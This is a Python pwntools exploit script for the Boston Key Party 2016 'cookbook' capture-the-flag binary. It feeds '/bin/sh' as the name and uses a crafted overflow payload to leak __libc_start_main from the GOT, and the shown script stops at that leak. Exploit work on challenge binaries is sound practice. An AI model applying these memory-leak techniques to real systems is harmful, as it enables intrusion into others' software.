# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#

from pwn import *

r = process('./cookbook')
b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def s(msg):
    r.send(msg + '\n')

def leak(addr):
    s('c')
    s('n')
    s('d')
    s('q')
    s('g')
    s('40C')
    payload = '\x00' * 124
    payload += p32(addr)
    s(payload)
    s('c')
    r.recv()
    s('p')
    resp = r.recvuntil('[q]uit\n')
    print resp
    leaked = u32(resp.split('recipe type: ')[1][0:4])
    s('q')
    return leaked

if __name__ == "__main__":
    r.recvuntil("what's your name?")

    s('/bin/sh\x00')
    
    r.recvuntil('[q]uit\n')

    LIBC_START_MAIN = leak(0x804d03c)

    log.info('LIBC_START_MAIN: 0x%x' % LIBC_START_MAIN)

    raw_input('after leaking __libc_start_main@got...')
